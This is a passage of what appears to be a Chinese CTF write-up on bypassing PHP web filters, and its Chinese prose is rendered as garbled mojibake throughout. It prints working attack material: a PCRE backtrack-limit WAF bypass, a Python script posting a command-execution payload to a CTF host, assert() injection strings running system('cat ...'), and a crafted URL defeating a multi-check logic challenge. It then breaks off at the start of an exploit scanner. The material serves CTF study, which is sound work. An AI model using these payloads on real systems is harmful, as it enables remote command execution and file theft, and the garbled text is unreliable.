ä¼šåŒ¹é…å®Œæ¥ä¸‹æ¥çš„æ‰€æœ‰å­—ç¬¦ï¼Œç›®å‰æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯è¯»å–ä¸‹ä¸€ä¸ªæ­£åˆ™æ—¶å°±å‡ºé—®é¢˜äº†ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li>å‘ç°è¾“å…¥å·²ç»æ²¡ä¸œè¥¿åŒ¹é…äº†ã€‚æ­¤æ—¶ NFA å¼€å§‹å›æº¯ï¼Œå›é€€ä¹‹å‰åŒ¹é…çš„å­—ç¬¦ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaa</span><br></code></pre></td></tr></table></figure><ul><li>å›é€€å‡ºæ¥çš„å­—ç¬¦ <code>a</code> ä»ç„¶æ— æ³•åŒ¹é… <code>[(</code>;?&gt;]&#96;ã€‚ç»§ç»­å›æº¯ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaa</span><br></code></pre></td></tr></table></figure><ul><li>å›æº¯è¿™ä¸€æ­¥éª¤ä¼šé‡å¤æ‰§è¡Œï¼Œç›´åˆ°å›æº¯åˆ°ä¸‹é¢çš„çŠ¶æ€ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<br></code></pre></td></tr></table></figure><ul><li>è¿™ä¸€æ­¥å›æº¯å›é€€å‡ºæ¥çš„å­—ç¬¦æ˜¯ <code>;</code>ï¼ŒåŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ <code>[(</code>;?&gt;]&#96;ã€‚ä¾¿åœæ­¢å›æº¯ï¼ŒåŒ¹é…ä¸Šå­—ç¬¦ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure><ul><li>æœ€åçš„ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å®Œæ¥ä¸‹æ¥çš„æ‰€æœ‰å†…å®¹ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li>å®Œå…¨åŒ¹é…æˆåŠŸï¼Œè¿”å› <code>true</code>ã€‚å¦‚æœæˆ‘ä»¬æ•°ä¸€ä¸‹ï¼Œä¼šå‘ç°å›æº¯æ¬¡æ•°ä¸º <code>8</code>ï¼Œè€Œå›æº¯æ¬¡æ•°æ˜¯æœ‰ä¸Šé™çš„ï¼Œé»˜è®¤æ˜¯ <code>100</code> ä¸‡ã€‚å¦‚æœè¾“å…¥å­—ç¬¦ä¸²æ‰§è¡Œæ­£åˆ™æ—¶å›æº¯æ¬¡æ•°è¶…è¿‡äº†è¿™ä¸ªä¸Šé™ï¼Œå°±ä¼šè¿”å› <code>false</code>ã€‚ä½†è¿™ä¸ª <code>false</code> å¯ä»¥è¢«å¼ºåˆ¶è½¬æ¢ã€‚</li></ul><p>ä¾‹å¦‚ä¸‹é¢çš„ WAFï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id = 1 UNION &quot;</span> . <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;/*!A*/ &quot;</span>, <span class="hljs-number">10000</span>) . <span class="hljs-string">&quot;SELECT name, email FROM users;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL Injection&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No SQL Injection detected.&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å¯ä»¥åˆ©ç”¨ <code>pcre</code> çš„å›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡ã€‚</li></ul><p>ä½†æ˜¯ä¸‹é¢çš„ WAFï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>) === <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// fwrite($f, $input); ...</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨äº† <code>===</code> å¼ºç­‰äºï¼Œ<code>PREG_BACKTRACK_LIMIT_ERROR</code> ä¸ç­‰äº <code>0</code>ã€‚åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>payload</code> æœ«å°¾åŠ ä¸€å † <code>a</code>ï¼Œä½¿å…¶è¶…è¿‡å›æº¯é™åˆ¶ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br>res = requests.post(<span class="hljs-string">&quot;http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)<br><span class="hljs-comment">#print(payload)</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="20-json-decode-json-true-cmd"><a href="#20-json-decode-json-true-cmd" class="headerlink" title="(20) json_decode($json, true)[&#39;cmd&#39;];"></a>(20) <code>json_decode($json, true)[&#39;cmd&#39;];</code></h2><ul><li><code>json_decode()</code> æ˜¯ä¸€ä¸ªç”¨äºå°† JSON æ ¼å¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º PHP æ•°æ®ç»“æ„ï¼ˆæ•°ç»„æˆ–å¯¹è±¡ï¼‰çš„å‡½æ•°ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$json</span> = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;: &quot;echo hello&quot;, &quot;user&quot;: &quot;admin&quot;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><ul><li><p><code>json_decode($json, true)</code> å°† JSON å­—ç¬¦ä¸²è§£æä¸º PHP å…³è”æ•°ç»„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-comment">// $array ç°åœ¨ç­‰äºï¼š[&quot;cmd&quot; =&gt; &quot;echo hello&quot;, &quot;user&quot; =&gt; &quot;admin&quot;]</span><br><span class="hljs-variable">$command</span> = <span class="hljs-variable">$array</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-comment">// $command ç°åœ¨ç­‰äº &quot;echo hello&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><code>json_decode($json, false)</code> å°† JSON å­—ç¬¦ä¸²è§£æä¸ºä¸€ä¸ª PHP å¯¹è±¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-comment">// $object ç°åœ¨æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶å±æ€§å¦‚ä¸‹ï¼š</span><br><span class="hljs-comment">// $object-&gt;cmd = &quot;echo hello&quot;</span><br><span class="hljs-comment">// $object-&gt;user = &quot;admin&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="21-assert-æ³¨å…¥"><a href="#21-assert-æ³¨å…¥" class="headerlink" title="(21) assert æ³¨å…¥"></a>(21) <code>assert</code> æ³¨å…¥</h2><ul><li><code>assert(&quot;intval($_GET[num])==1919810&quot;)</code></li><li><code>assert</code> é‡Œé¢ç›´æ¥æŠŠæˆ‘ä»¬çš„è¾“å…¥æ‹¼æ¥è¿›å»äº† <code>?num=114514)==114514;//</code></li></ul><h2 id="22-strstr"><a href="#22-strstr" class="headerlink" title="(22) strstr()"></a>(22) <code>strstr()</code></h2><ul><li><p>æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å›è¯¥å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å› <code>FALSE</code>ã€‚</p></li><li><p>è¯­æ³•ï¼š<code>strstr(string, search, before_search)</code></p></li><li><p><code>string</code>: å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</p></li><li><p><code>search</code>: å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚å¦‚æœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…è¯¥æ•°å­—å¯¹åº”çš„ ASCII å€¼çš„å­—ç¬¦ã€‚</p></li><li><p><code>before_search</code>: å¯é€‰ã€‚ä¸€ä¸ªé»˜è®¤å€¼ä¸º <code>false</code> çš„å¸ƒå°”å€¼ã€‚å¦‚æœè®¾ç½®ä¸º <code>true</code>ï¼Œå®ƒå°†è¿”å› <code>search</code> å‚æ•°ç¬¬ä¸€æ¬¡å‡ºç°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚</p></li><li><p>æ³¨æ„è¿™ä¸ªå‡½æ•°æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚è¿™é‡Œå¯ä»¥ç”¨ <code>PHP://</code> ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥è€ƒè™‘å¦å¤–ä¸€ä¸ª PHP ä¼ªåè®®ï¼š<code>data://</code></p></li></ul><h2 id="23-mb-substr"><a href="#23-mb-substr" class="headerlink" title="(23) mb_substr()"></a>(23) <code>mb_substr()</code></h2><ul><li><p>è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä¸­æ–‡å­—ç¬¦ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚<code>substr()</code> åªé’ˆå¯¹è‹±æ–‡å­—ç¬¦</p></li><li><p>è¯­æ³•ï¼š<code>mb_substr(å­—ç¬¦ä¸², èµ·å§‹, é•¿åº¦, ç¼–ç )</code>ï¼Œå…¶ä¸­é•¿åº¦å’Œç¼–ç å¯é€‰ã€‚</p></li><li><p>å°†åœŸè€³å…¶è¯­ä¸­çš„ â€œÄ°stanbulâ€ è½¬æ¢ä¸ºå°å†™æ—¶ï¼Œå¯èƒ½è¾“å‡ºå¸¦ç‚¹çš„ â€œiâ€ï¼ˆâ€iÌ‡stanbulâ€ï¼‰</p></li></ul><h2 id="24-mb-strpos"><a href="#24-mb-strpos" class="headerlink" title="(24) mb_strpos()"></a>(24) <code>mb_strpos()</code></h2><ul><li><p>è¿”å›è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²åœ¨åˆ«ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</p></li><li><p>è¯­æ³•ï¼š<code>mb_strpos (å­—ç¬¦ä¸², è¦æœç´¢çš„å­—ç¬¦ä¸²)</code></p></li><li><p>å› ä¸º <code>mb_strpos()</code> åªä¼šè¿”å›é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬ä¼ ç±»ä¼¼äº <code>hint.php?æƒ³è¦æŸ¥çœ‹çš„æ–‡ä»¶è·¯å¾„</code> è¿™æ ·çš„ <code>payload</code> çš„è¯ï¼Œåˆ‡å‰²çš„ç»“æœæ˜¯ <code>hint.php</code>ï¼Œé€šè¿‡äº†è¿‡æ»¤ã€‚é—®é¢˜æ˜¯è¿‡æ»¤é€šè¿‡äº†åè¿™ä¸ª <code>payload</code> æ ¹æœ¬å°±ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ–‡ä»¶åã€‚</p></li><li><p>ä¸æ€¥ï¼Œ<code>include</code> æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ç‰¹æ€§ï¼š</p><ul><li>å¦‚æœå‚æ•°ä¸­åŒ…å« <code>../</code> è¿™æ ·çš„è·¯å¾„ï¼Œè§£æå™¨åˆ™ä¼šå¿½ç•¥ <code>../</code> ä¹‹å‰çš„å­—ç¬¦ä¸²è€Œå»åœ¨å½“å‰ç›®å½•çš„çˆ¶ç›®å½•ä¸‹å¯»æ‰¾æ–‡ä»¶ã€‚</li><li>è¿™æ„å‘³ç€æˆ‘ä»¬åªè¦åœ¨æƒ³è¦æŸ¥çœ‹çš„æ–‡ä»¶è·¯å¾„ä¸­ä½¿ç”¨ <code>../</code> è¿™ç±»è·¯å¾„ï¼Œ<code>include</code> å°±ä¼šè‡ªåŠ¨å¿½ç•¥å‰é¢çš„å†…å®¹ï¼Œè¿™æ ·çœŸæ­£åŒ…å«çš„æ–‡ä»¶åå°±æ˜¯æœ‰æ•ˆçš„äº†ã€‚ä¸€ç‚¹ä¸€ç‚¹è¯•å°±å¯ä»¥å¾—åˆ°æ­£ç¡®çš„è·¯å¾„äº†ã€‚</li></ul></li></ul><h2 id="24-æ–‡ä»¶å­˜åœ¨"><a href="#24-æ–‡ä»¶å­˜åœ¨" class="headerlink" title="(24) æ–‡ä»¶å­˜åœ¨"></a>(24) æ–‡ä»¶å­˜åœ¨</h2><ul><li><p><code>file_exists()</code> è¿”å›å¸ƒå°”å€¼ï¼š</p><ul><li>å¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œåˆ™è¿”å› <code>TRUE</code></li><li>å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™è¿”å› <code>FALSE</code></li></ul><p>ä¸å…¶ä»–ç›¸å…³å‡½æ•°ä¸åŒçš„æ˜¯ï¼š</p><ul><li><code>is_file($filename)</code> ä»…æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸æ˜¯ç›®å½•ã€‚</li><li><code>is_dir($filename)</code> æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ªç›®å½•ï¼Œå“ªæ€•å®ƒæ˜¯ç©ºçš„ã€‚</li></ul></li></ul><h2 id="25-strpos"><a href="#25-strpos" class="headerlink" title="(25) strpos"></a>(25) <code>strpos</code></h2><ul><li>æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› <code>FALSE</code>ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">templates/<span class="hljs-string">&#x27;.system(&#x27;</span>cat+./templates/flag.php<span class="hljs-string">&#x27;).&#x27;</span>.php<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;templates/&#x27;.system(&#x27;cat+./templates/flag.php&#x27;).&#x27;.php&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="é€»è¾‘æ¼æ´ç»•è¿‡"><a href="#é€»è¾‘æ¼æ´ç»•è¿‡" class="headerlink" title="é€»è¾‘æ¼æ´ç»•è¿‡"></a>é€»è¾‘æ¼æ´ç»•è¿‡</h2><ul><li>æºç å¦‚ä¸‹ï¼š</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$v2</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$v3</span>=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$a</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;foo&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$a</span>))&#123;<br>   <span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>   <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>])&#123;<br>       (<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>]&gt;<span class="hljs-number">2021</span>)?<span class="hljs-variable">$v1</span>=<span class="hljs-number">1</span>:<span class="hljs-literal">NULL</span>;<br>   &#125;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>]))&#123;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>])!==<br><br><span class="hljs-number">5</span> OR !<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>][<span class="hljs-number">0</span>])) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>       <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;me7e&quot;</span>, <span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;a2&quot;</span>]);<br>       <span class="hljs-variable">$pos</span>===<span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>       <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>           <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;me7e&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>       &#125;<br>       <span class="hljs-variable">$v2</span>=<span class="hljs-number">1</span>;<br>   &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>];<br><span class="hljs-variable">$d</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dog&#x27;</span>];<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>])&#123;<br>   <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$d</span>) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>]!==<span class="hljs-variable">$d</span>)&#123;<br>       <span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;3|1|c&quot;</span>,<span class="hljs-variable">$d</span>.<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>       <span class="hljs-title function_ invoke__">strpos</span>((<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$d</span>), <span class="hljs-string">&quot;me7e2021&quot;</span>)?<span class="hljs-variable">$v3</span>=<span class="hljs-number">1</span>:<span class="hljs-literal">NULL</span>;<br>   &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v1</span> &amp;&amp; <span class="hljs-variable">$v2</span> &amp;&amp; <span class="hljs-variable">$v3</span>)<br>&#123;<br>   <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag13</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p><strong>ç¬¬ä¸€å±‚</strong>ï¼š éœ€è¦ä¼ å…¥ä¸€ä¸ªä¸æ˜¯æ•°å­—ä½†æ˜¯å¤§äº 2021 çš„å‚æ•°ï¼Œæ ¹æ®å¼±æ¯”è¾ƒå¯ä»¥è®© <code>bar1=2022asd</code></p></li><li><p><strong>ç¬¬äºŒå±‚</strong>: <code>bar2</code> æœ‰ 5 ä¸ªå…ƒç´ ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªæ˜¯æ•°ç»„ï¼Œè®© <code>bar2=[[0],2,3,4,5]</code>ï¼Œé€šè¿‡å¼±æ¯”è¾ƒç»•è¿‡ <code>array_search</code> çš„æœç´¢ </p></li><li><p><strong>ç¬¬ä¸‰å±‚</strong>ï¼šå› ä¸ºæ˜¯ PHP5ï¼Œä¸” <code>eregi</code> å­˜åœ¨ <code>00</code> æˆªæ–­å¯ä»¥ç›´æ¥ç»•è¿‡</p></li><li><p>æ‰€ä»¥å¯ä»¥æ„é€ å¦‚ä¸‹ URLï¼š<br><code>?foo=&#123;&quot;bar1&quot;:&quot;2022asd&quot;,&quot;bar2&quot;:[[0],2,3,4,5],&quot;a2&quot;:&quot;me7eorite&quot;&#125;&amp;cat[1][]=&quot;1&quot;&amp;dog=what&amp;cat[0]=%00me7e2021</code></p></li></ul><hr><h2 id="ä»£ç æ··æ·†-å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#ä»£ç æ··æ·†-å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="ä»£ç æ··æ·† (å¼ºç½‘æ¯ 2019 - é«˜æ˜çš„é»‘å®¢)"></a>ä»£ç æ··æ·† (å¼ºç½‘æ¯ 2019 - é«˜æ˜çš„é»‘å®¢)</h2><ul><li><p>é¦–é¡µæç¤ºäº†æºç æ³„éœ²ï¼Œä¸‹è½½ä¸‹æ¥åå‘ç°æœ‰ 3000 å¤šä¸ªæ–‡ä»¶ï¼Œè€Œä¸”æ–‡ä»¶ä¸­æœ‰ <code>eval</code> è¿˜æœ‰ <code>assert</code>ï¼Œä½†æ˜¯æœ‰äº›æ²¡æœ‰æ‰§è¡Œå‘½ä»¤çš„åŠŸèƒ½ï¼Œä¼¼ä¹æ˜¯è¢«æ··æ·†äº†ã€‚</p></li><li><p>é€šè¿‡ç¼–å†™ä¸€ä¸ªè„šæœ¬éå†è¿™äº› <code>eval</code> å’Œ <code>assert</code> æ–¹æ³•æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤çš„åŠŸèƒ½ã€‚exp å¦‚ä¸‹ï¼š</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;startï¼š  &#x27;</span>+  